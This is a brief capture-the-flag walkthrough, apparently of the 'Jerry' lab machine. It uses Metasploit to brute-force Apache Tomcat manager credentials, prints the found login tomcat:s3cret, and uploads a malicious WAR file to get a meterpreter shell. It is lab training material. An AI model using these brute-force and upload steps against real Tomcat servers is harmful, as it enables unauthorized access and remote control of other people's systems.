# Jerry Write-Up

Easy

Tags: 
`Malicious WAR File Upload`

## Intro

1. Brute-force Credential Apache Tomcat
2. Exploit Apache Tomcat

## Exploit

### Port scanning

```
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

### Brute-force Credential

```
use auxiliary/scanner/http/tomcat_mgr_login
```

rhosts, rport > run

```
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
```

### Exploit Apache Tomcat

```
use exploit/multi/http/tomcat_mgr_upload
```

```
meterpreter > shell
```